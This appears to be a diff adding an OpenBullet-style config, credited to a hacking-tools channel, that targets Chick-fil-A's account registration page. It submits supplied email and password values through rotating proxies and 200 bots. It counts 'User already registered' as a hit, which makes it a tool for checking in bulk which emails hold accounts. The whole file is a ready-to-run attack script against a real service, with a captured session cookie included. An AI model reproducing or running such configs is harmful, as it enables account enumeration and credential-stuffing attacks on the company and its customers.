@@ -1,0 +1,83 @@
+[SETTINGS]
+{
+  "Name": "Chick-fil-A VM(@hackingtoolsprvi8)",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2022-01-14T14:18:51.4609438+01:00",
+  "AdditionalInfo": "",
+  "Author": "@hackingtoolsprvi8",
+  "Version": "1.4.5 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Chick-fil-A REQUEST POST "https://manage.my.chick-fil-a.com/registeraccount" 
+  CONTENT "_csrf=e4d76cc6-0713-4347-95de-4fe0115f9a1e&resumeUrl=https%3A%2F%2Flogin.my.chick-fil-a.com%2Fas%2FAN8qU%2Fresume%2Fas%2Fauthorization.ping&clientId=CfaDotCom&redirectUri=http%3A%2F%2Fwww.chick-fil-a.com%2Fone&tmxComplete=true&firstName=asas&lastName=asa&primaryEmail=<USER>&confirmEmail=<USER>&credentials=<PASS>&confirmCredentials=<PASS>&consent=consent&register=Submit" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: manage.my.chick-fil-a.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 407" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "sec-ch-ua: \" Not;A Brand\";v=\"99\", \"Google Chrome\";v=\"97\", \"Chromium\";v=\"97\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36" 
+  HEADER "Origin: https://manage.my.chick-fil-a.com" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Referer: https://manage.my.chick-fil-a.com/registeraccount?goto=https://login.my.chick-fil-a.com/as/AN8qU/resume/as/authorization.ping&client_id=CfaDotCom&redirectUri=http://www.chick-fil-a.com/one&fullRedirectUri=https://www.chick-fil-a.com/account/signincrn" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Cookie: cfacom#lang=en; ASP.NET_SessionId=2r4acbomul4amdacaxhfny5d; UTMsessionStart=true; _gcl_au=1.1.2092051882.1642111066; _ga=GA1.2.1007370009.1642111066; _gid=GA1.2.434597497.1642111066; _uetsid=d72b6e6074bb11ecaf7905982ef1f7c0; _uetvid=d72b9e1074bb11ec94a6f133cf0b0bd7; _pin_unauth=dWlkPVpXWTNaVFpsTVdRdE5UVXdNeTAwTmpFNExUa3dPR0V0WVdWaU16WTRNakEzTVdNMw; _clck=1p5w91y|1|ey3|0; emHashed=(not set in data layer); _clsk=4zxsxz|1642111066753|1|1|i.clarity.ms/collect; OptanonConsent=isGpcEnabled=0&datestamp=Thu+Jan+13+2022+16%3A57%3A46+GMT-0500+(Eastern+Standard+Time)&version=6.25.0&isIABGlobal=false&hosts=&consentId=58313d39-3d0e-4ff4-ba62-349ab8d21ea8&interactionCount=1&landingPath=https%3A%2F%2Fwww.chick-fil-a.com%2Fone&groups=1%3A1%2C2%3A1%2C3%3A1%2C4%3A1; _ga_W1ZL54JC7M=GS1.1.1642111065.1.0.1642111067.58; XSRF-TOKEN=e4d76cc6-0713-4347-95de-4fe0115f9a1e; MY_PROFILE_10_JSESSIONID=OWNlMjk4ZDAtZGM3NS00NDRjLTg4ZDUtOTFkNGU4Y2FhMzQ2; emHashed=undefined; AWSALB=TVj7IHJ1ie9qLRrC86s7LoGmN/CtKE6IT1t4E6eFTdMTOF+dwgP5olPm/ZQ4SAMV8iUU8TkgTViEC42OiUpE40x8bC9Zr46vTD09zNij0ySCwvu4wSOLbWtKdeKW; AWSALBCORS=TVj7IHJ1ie9qLRrC86s7LoGmN/CtKE6IT1t4E6eFTdMTOF+dwgP5olPm/ZQ4SAMV8iUU8TkgTViEC42OiUpE40x8bC9Zr46vTD09zNij0ySCwvu4wSOLbWtKdeKW" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "User already registered" 
+  KEYCHAIN Failure OR 
+    KEY "Sorry, we’re unable to create your account" 
+
+FUNCTION Constant "@hackingtoolsprvi8" -> VAR "Config By" 
+
